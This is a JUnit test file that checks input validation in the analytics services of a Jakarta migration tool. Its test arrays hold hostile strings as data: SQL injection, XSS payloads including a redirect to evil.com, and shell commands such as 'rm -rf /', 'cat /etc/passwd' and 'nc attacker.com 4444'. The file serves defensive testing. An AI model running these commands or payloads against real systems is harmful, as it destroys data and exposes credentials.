package adrianmikula.jakartamigration.analytics.service;

import adrianmikula.jakartamigration.analytics.config.SupabaseConfig;
import adrianmikula.jakartamigration.analytics.util.ConcurrencyTestHelper;
import adrianmikula.jakartamigration.analytics.util.TestDataFactory;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.api.io.TempDir;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.nio.file.Path;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatNoException;
import static org.mockito.Mockito.*;

/**
 * Tests for input validation and sanitization in analytics services.
 * Tests SQL injection prevention, XSS protection, and data limits.
 */
@ExtendWith(MockitoExtension.class)
class DataValidationTest {

    @TempDir
    Path tempDir;

    @Mock
    private SupabaseConfig supabaseConfig;

    private UserIdentificationService userIdentificationService;
    private UsageService usageService;
    private ErrorReportingService errorReportingService;

    @BeforeEach
    void setUp() {
        when(supabaseConfig.getSupabaseUrl()).thenReturn("https://test-wmngdqhgybiomoxjfxpc.supabase.co");
        when(supabaseConfig.getSupabaseAnonKey()).thenReturn("test-anon-key");
        when(supabaseConfig.isAnalyticsEnabled()).thenReturn(true);
        when(supabaseConfig.isErrorReportingEnabled()).thenReturn(true);
        when(supabaseConfig.getAnalyticsBatchSize()).thenReturn(5);
        when(supabaseConfig.getAnalyticsFlushIntervalSeconds()).thenReturn(1);
        when(supabaseConfig.isConfigured()).thenReturn(true);

        userIdentificationService = new UserIdentificationService(tempDir, supabaseConfig);
        usageService = new UsageService(userIdentificationService);
        errorReportingService = new ErrorReportingService(userIdentificationService);
    }

    @AfterEach
    void tearDown() {
        if (usageService != null) {
            usageService.close();
        }
        if (errorReportingService != null) {
            errorReportingService.close();
        }
        if (userIdentificationService != null) {
            userIdentificationService.close();
        }
    }

    @Test
    void shouldValidateCreditTypeInput() {
        // Given
        String[] validTypes = {"basic_scan", "advanced_scan", "pdf_report", "refactor"};
        String[] invalidTypes = {
            "scan'; DROP TABLE users; --",
            "scan\"; DELETE FROM usage_events; --",
            "scan' OR '1'='1",
            "scan\"; SELECT * FROM users; --"
        };

        // When/Then
        for (String validType : validTypes) {
            // Should not throw exception for valid types
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(validType));
        }

        for (String invalidType : invalidTypes) {
            // Should handle SQL injection attempts gracefully
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(invalidType));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldValidateUpgradeSourceInput() {
        // Given
        String[] validSources = {"truncation_notice", "feature_limit", "upgrade_button", "banner"};
        String[] invalidSources = {
            "source'; UPDATE users SET admin=1; --",
            "source\"; DELETE FROM error_reports; --",
            "source' OR '1'='1",
            "source\"><script>alert('xss')</script>"
        };

        // When/Then
        for (String validSource : validSources) {
            // Should not throw exception for valid sources
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(validSource));
        }

        for (String invalidSource : invalidSources) {
            // Should handle XSS and SQL injection attempts gracefully
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(invalidSource));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleVeryLongInput() {
        // Given
        String longCreditType = "a".repeat(10000); // 10KB string
        String longUpgradeSource = "b".repeat(10000);
        String longErrorMessage = "c".repeat(10000);

        // When/Then
        // Should handle very long inputs without crashing
        assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(longCreditType));
        
        assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(longUpgradeSource));

        assertThatNoException().isThrownBy(() -> errorReportingService.reportError(new RuntimeException(longErrorMessage)));

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleSpecialCharactersInInput() {
        // Given
        String[] specialCharInputs = {
            "scan@with#special$chars%",
            "upgrade<with>brackets",
            "source&with=ampersands",
            "type|with|pipes",
            "data\\with\\backslashes",
            "input/with/slashes",
            "测试中文🚀📊",
            "🔒🔑📊💾",
            "\u0000\u0001\u0002", // Control characters
            "input\u202Ewith\u202Dzero\u200Cwidth\u200Djoiners"
        };

        // When/Then
        for (String input : specialCharInputs) {
            // Should handle special characters gracefully
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(input));
            
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(input));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleUnicodeInput() {
        // Given
        String[] unicodeInputs = {
            "扫描", // Chinese for "scan"
            "mise_à_jour", // French accents
            "escaneo", // Portuguese
            "スキャン", // Japanese
            "сканирование", // Russian
            "مسح", // Arabic
            "검색", // Korean
            "🔍📊📈", // Emojis
            "café_scan", // Mixed
            "naïve_upgrade" // Special characters
        };

        // When/Then
        for (String input : unicodeInputs) {
            // Should handle Unicode correctly
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(input));
            
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(input));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleNullInputs() {
        // When/Then
        // Should handle null inputs gracefully
        assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(null));
        
        assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(null));
        
        assertThatNoException().isThrownBy(() -> errorReportingService.reportError(null));
        
        assertThatNoException().isThrownBy(() -> errorReportingService.reportError(new RuntimeException("test"), null));
        
        assertThatNoException().isThrownBy(() -> errorReportingService.setCurrentTab(null));

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleEmptyInputs() {
        // When/Then
        // Should handle empty inputs gracefully
        assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(""));
        
        assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(""));
        
        assertThatNoException().isThrownBy(() -> errorReportingService.reportError(new RuntimeException("test"), ""));
        
        assertThatNoException().isThrownBy(() -> errorReportingService.setCurrentTab(""));

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleWhitespaceInputs() {
        // Given
        String[] whitespaceInputs = {
            "   spaced_input   ",
            "\t\ttabbed\tinput\t\t",
            "\n\nnewlines\n\ninput\n\n",
            "\r\rcarriage\rreturn\r\rinput\r\r",
            " \t\n\r mixed \t\n\r whitespace \t\n\r "
        };

        // When/Then
        for (String input : whitespaceInputs) {
            // Should trim or handle whitespace appropriately
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(input));
            
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(input));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldPreventHtmlInjection() {
        // Given
        String[] htmlInjectionInputs = {
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src=javascript:alert('xss')>",
            "<svg onload=alert('xss')>",
            "data:text/html,<script>alert('xss')</script>",
            "scan\"><script>document.location='http://evil.com'</script>",
            "upgrade<input type=hidden name=evil value=1>"
        };

        // When/Then
        for (String input : htmlInjectionInputs) {
            // Should handle HTML injection attempts gracefully
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(input));
            
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(input));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldPreventCommandInjection() {
        // Given
        String[] commandInjectionInputs = {
            "scan; rm -rf /",
            "upgrade && cat /etc/passwd",
            "scan | nc attacker.com 4444",
            "scan`whoami`",
            "upgrade$(curl evil.com)",
            "scan; DROP TABLE users",
            "upgrade'; DELETE FROM usage_events; --"
        };

        // When/Then
        for (String input : commandInjectionInputs) {
            // Should handle command injection attempts gracefully
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(input));
            
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(input));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleJsonLikeInputs() {
        // Given
        String[] jsonLikeInputs = {
            "{\"creditType\":\"basic_scan\",\"malformed\":true}",
            "[\"upgrade\",\"source\",\"test\"]",
            "{\"data\":{\"injection\":\"true\"}}",
            "scan\"}DROP TABLE users;{\"type\":\"basic_scan\"",
            "upgrade\"}DELETE FROM error_reports;{\"source\":\"test\""
        };

        // When/Then
        for (String input : jsonLikeInputs) {
            // Should handle JSON-like inputs gracefully
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(input));
            
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(input));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleEncodedInputs() {
        // Given
        String[] encodedInputs = {
            "scan%20with%20spaces", // URL encoded
            "upgrade%3Bsource%3Dtest", // URL encoded semicolons
            "scan%2Bwith%2Bpluses", // URL encoded plus signs
            "credit%22type%22%3A%22basic_scan%22", // URL encoded JSON
            "upgrade%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E" // URL encoded XSS
        };

        // When/Then
        for (String input : encodedInputs) {
            // Should handle encoded inputs appropriately
            assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(input));
            
            assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(input));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldValidateErrorMessages() {
        // Given
        String[] maliciousErrorMessages = {
            "Error'; DROP TABLE error_reports; --",
            "Error\"; DELETE FROM users; --",
            "Error'><script>alert('xss')</script>",
            "Error`rm -rf /`",
            "Error|nc attacker.com 4444"
        };

        // When/Then
        for (String errorMessage : maliciousErrorMessages) {
            RuntimeException exception = new RuntimeException(errorMessage);
            
            // Should handle malicious error messages gracefully
            assertThatNoException().isThrownBy(() -> errorReportingService.reportError(exception));
        }

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldValidateTabNames() {
        // Given
        String[] validTabs = {"Dependencies", "Advanced Scans", "Migration Strategy", "Platforms"};
        String[] invalidTabs = {
            "Tab'; DROP TABLE users; --",
            "Tab\"; DELETE FROM analytics; --",
            "Tab'><script>alert('xss')</script>",
            "Tab`whoami`",
            "Tab|nc evil.com 4444"
        };

        // When/Then
        for (String validTab : validTabs) {
            // Should accept valid tab names
            assertThatNoException().isThrownBy(() -> errorReportingService.setCurrentTab(validTab));
        }

        for (String invalidTab : invalidTabs) {
            // Should handle malicious tab names gracefully
            assertThatNoException().isThrownBy(() -> errorReportingService.setCurrentTab(invalidTab));
        }
    }

    @Test
    void shouldHandleLargeErrorStackTraces() {
        // Given
        StringBuilder largeStackTrace = new StringBuilder();
        for (int i = 0; i < 1000; i++) {
            largeStackTrace.append("at com.example.Class.method").append(i).append("(Class.java:").append(i).append(")\n");
        }
        RuntimeException largeException = new RuntimeException("Large error test");
        largeException.setStackTrace(new StackTraceElement[0]); // Simplified for test

        // When/Then
        // Should handle large stack traces gracefully
        assertThatCode(() -> errorReportingService.reportError(largeException))
            .doesNotThrowAnyException();

        waitForQueuesToEmpty(5);
    }

    @Test
    void shouldHandleConcurrentMaliciousInputs() throws Exception {
        // Given
        int threadCount = 10;
        String[] maliciousInputs = {
            "scan'; DROP TABLE users; --",
            "upgrade\"><script>alert('xss')</script>",
            "credit`rm -rf /`",
            "source|nc attacker.com 4444"
        };

        // When
        assertThatCode(() -> {
            ConcurrencyTestHelper.runConcurrentConsumer(threadCount, (threadIndex) -> {
                String input = maliciousInputs[threadIndex % maliciousInputs.length];
                usageService.trackCreditUsage(input);
                usageService.trackUpgradeClick(input);
                errorReportingService.reportError(new RuntimeException("Error: " + input));
            });
        }).doesNotThrowAnyException();

        // Then
        // Should handle concurrent malicious inputs without crashing
        waitForQueuesToEmpty(10);
        assertThat(usageService.getQueueSize()).isEqualTo(0);
        assertThat(errorReportingService.getQueueSize()).isEqualTo(0);
    }

    @Test
    void shouldMaintainDataIntegrityWithInvalidInputs() {
        // Given
        String originalCreditType = "basic_scan";
        String originalUpgradeSource = "test_source";
        String maliciousInput = "scan'; DROP TABLE users; --";

        // When - track usage with malicious input, should be handled safely
        assertThatCode(() -> usageService.trackCreditUsage(maliciousInput))
            .doesNotThrowAnyException();

        // Then
        // Should not affect previous valid data
        waitForQueuesToEmpty(5);
        
        // Service should still be functional
        assertThatCode(() -> usageService.trackCreditUsage("recovery_test"))
            .doesNotThrowAnyException();
    }

    @Test
    void shouldHandleInputAtBoundaryLimits() {
        // Given
        String nearMaxInput = "a".repeat(9999); // Just under reasonable limit
        String maxInput = "b".repeat(10000); // At reasonable limit
        String overMaxInput = "c".repeat(50000); // Over reasonable limit

        // When/Then
        // Should handle near-max inputs
        assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(nearMaxInput));
        
        // Should handle max inputs
        assertThatNoException().isThrownBy(() -> usageService.trackUpgradeClick(maxInput));
        
        // Should handle over-max inputs gracefully
        assertThatNoException().isThrownBy(() -> usageService.trackCreditUsage(overMaxInput));

        waitForQueuesToEmpty(5);
    }

    /**
     * Helper method to wait for both usage and error queues to empty.
     */
    private void waitForQueuesToEmpty(int timeoutSeconds) {
        long startTime = System.currentTimeMillis();
        long timeoutMs = timeoutSeconds * 1000L;
        
        while (System.currentTimeMillis() - startTime < timeoutMs) {
            if (usageService.getQueueSize() == 0 && errorReportingService.getQueueSize() == 0) {
                return;
            }
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        
        // If timeout reached, fail test
        assertThat(usageService.getQueueSize()).isEqualTo(0);
        assertThat(errorReportingService.getQueueSize()).isEqualTo(0);
    }
}
